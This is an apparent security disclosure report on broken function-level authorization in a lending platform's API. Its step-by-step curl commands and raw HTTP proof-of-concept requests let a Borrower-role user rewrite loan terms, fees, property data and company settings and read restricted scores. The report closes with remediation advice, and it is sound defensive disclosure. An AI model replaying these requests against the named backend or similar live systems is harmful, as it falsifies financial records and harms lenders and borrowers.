# Borrower Role Bypasses Server-Side Permission Controls on Own Resources (BFLA)

**Severity:** Medium — CVSS 3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N (7.1)
**Class:** CWE-285 — Improper Authorization
**Target:** `PATCH /api/v1/projects/`, `PATCH /api/v1/companies/`, `GET /api/v1/projects/.../scores/`
**Status:** Confirmed

---

## Summary

The backend API does not enforce the platform's permission flags on write operations. A Borrower-role user can modify Lender-restricted project fields (loan commitment, interest rate, lender fees, property valuation) and company settings despite having `projects_details_edit: false` and `company_edit: false`. Permission checks exist only in the frontend UI; the backend accepts all writes from any authenticated user regardless of role permissions.

**This is NOT the known IDOR issue.** The Borrower is modifying resources on **their own** project/company (same tenant, authorized to view) — the issue is performing unauthorized **write actions**, not accessing another tenant's objects.

---

## Steps to Reproduce

### Step 1 — Confirm Borrower permissions are disabled

```bash
curl -s 'https://backend.trustpoint.ai/api/v1/permissions/' \
  -H 'Authorization: Bearer <borrower_token>' | jq '.projects_details_edit, .company_edit, .scores_view'
```

All return `{"enabled": false}`.

### Step 2 — Modify Lender-restricted loan fields (should be denied, returns 200)

```bash
curl -X PATCH 'https://backend.trustpoint.ai/api/v1/projects/<project_id>/' \
  -H 'Authorization: Bearer <borrower_token>' \
  -H 'Content-Type: application/json' \
  -d '{"loan_commitment_amount": 999999, "interest_rate": "99.99", "lender_fees": 50000}'
```

**Result:** `200 OK` — values accepted and persisted. No `403 Forbidden`.

### Step 3 — Verify persistence

```bash
curl -s 'https://backend.trustpoint.ai/api/v1/projects/<project_id>/' \
  -H 'Authorization: Bearer <borrower_token>' \
  | jq '.loan_commitment_amount, .interest_rate, .lender_fees'
```

Returns the modified values.

### Step 4 — Modify building/property data (should be denied, returns 200)

```bash
curl -X PATCH 'https://backend.trustpoint.ai/api/v1/projects/<project_id>/buildings/<building_id>/' \
  -H 'Authorization: Bearer <borrower_token>' \
  -H 'Content-Type: application/json' \
  -d '{"address": "123 Attacker Modified St", "city": "Modifiedville"}'
```

**Result:** `200 OK` — persisted.

### Step 5 — Modify own company settings (should be denied, returns 200)

```bash
curl -X PATCH 'https://backend.trustpoint.ai/api/v1/companies/<borrower_company_id>/' \
  -H 'Authorization: Bearer <borrower_token>' \
  -H 'Content-Type: application/json' \
  -d '{"name": "Modified Company Name"}'
```

**Result:** `200 OK`

### Step 6 — Access scores (should be denied, returns 200)

```bash
curl -s 'https://backend.trustpoint.ai/api/v1/projects/<project_id>/scores/' \
  -H 'Authorization: Bearer <borrower_token>'
```

**Result:** `200 OK` — full score data returned despite `scores_view: false`.

---

## Proof of Concept

### Request (Loan Term Modification)

```http
PATCH /api/v1/projects/7f7bb795-f972-4d46-99c9-1175180a1195/ HTTP/1.1
Host: backend.trustpoint.ai
Authorization: Bearer <redacted>
Content-Type: application/json

{
  "loan_commitment_amount": 999999,
  "interest_rate": "99.99",
  "lender_fees": 50000,
  "property_valuation": 1
}
```

### Response

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": "7f7bb795-f972-4d46-99c9-1175180a1195",
  "loan_commitment_amount": 999999,
  "interest_rate": "99.99",
  "lender_fees": 50000,
  "property_valuation": 1,
  ...
}
```

### Comparison: Properly Protected Endpoint

```http
POST /api/v1/projects/.../draw_requests/.../review/ HTTP/1.1
{"action": "APPROVE"}

HTTP/1.1 403 Forbidden
```

Draw request approval IS permission-checked. Project field writes are NOT. This inconsistency proves the issue is missing permission enforcement, not a design choice.

---

## Affected Endpoints

| Endpoint | Permission Bypassed | HTTP Response |
|----------|-------------------|---------------|
| `PATCH /api/v1/projects/<id>/` | `projects_details_edit: false` | **200 OK** |
| `PATCH /api/v1/projects/<id>/buildings/<id>/` | `projects_details_edit: false` | **200 OK** |
| `PATCH /api/v1/companies/<own_id>/` | `company_edit: false` | **200 OK** |
| `GET /api/v1/projects/<id>/scores/` | `scores_view: false` | **200 OK** |
| `PATCH /api/v1/projects/<id>/milestones/<id>/` | `project_milestones_edit: false` | 400 (business logic only, no permission check) |
| `POST /api/v1/projects/<id>/draw_requests/` | `drawrequests_create: false` | 400 (business logic only, no permission check) |

---

## Impact

- **Financial manipulation:** Borrower alters loan commitment amount, interest rate, and lender fees on their own project — fields restricted to Lender role
- **Data integrity:** Property address, building details, and company configuration can be falsified by any authenticated user
- **Systemic scope:** The 56+ permission flags appear enforced only in the frontend UI. The backend API ignores them entirely on write operations, except for draw request approval actions (APPROVE/FINALIZE/mark_as_paid which correctly return 403)

---

## Remediation

1. Enforce permission flags server-side on all write endpoints (not just draw request approvals)
2. Validate that the user's role permits the specific write operation before processing
3. Add integration tests verifying each permission flag is enforced at the API layer

---

## References

- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [OWASP API5:2023 — Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
